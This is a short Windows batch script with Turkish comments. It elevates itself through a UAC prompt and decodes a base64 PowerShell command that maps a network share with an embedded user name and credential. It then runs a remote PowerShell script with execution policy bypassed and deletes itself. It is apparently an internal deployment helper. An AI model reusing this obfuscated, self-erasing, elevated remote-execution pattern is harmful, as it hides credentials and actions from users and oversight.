@echo off
title SISTEM PANELI YUKLENIYOR...
color 0B

:: Admin yetkisi kontrolü
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' ( goto UACPrompt ) else ( goto gotAdmin )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\admin.vbs"
"%temp%\admin.vbs" & exit /B
:gotAdmin
if exist "%temp%\admin.vbs" ( del "%temp%\admin.vbs" )

:: GÜNCELLENMİŞ BASE64 (Hata vermeyen Out-Null yapısı kullanıldı)
set "BASE64_CODE=bmV0IHVzZSBQOiAvZGVsZXRlIC95IDI+JG51bGwgfCBPdXQtTnVsbDsgbmV0IHVzZSBQOiBcXDEwLjI0MS4xLjQxXGtleWRhdGFiaW1cQkFUX1NFVFVQIDFfa2V5ZGF0YWJpbV8wNiogL3VzZXI6a2V5dXNlciAvcGVyc2lzdGVudDpubw=="

powershell -NoP -C "$d=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%BASE64_CODE%')); iex $d"

if exist "P:\isvec_cakisi.ps1" (
    start "" powershell.exe -NoProfile -ExecutionPolicy Bypass -File "P:\isvec_cakisi.ps1"
) else (
    echo.
    echo [!] HATA: Teknik surucu baglanamadi. Lutfen ag baglantisini kontrol edin.
    pause
    exit
)

timeout /t 2 /nobreak >nul
(goto) 2>nul & del "%~f0"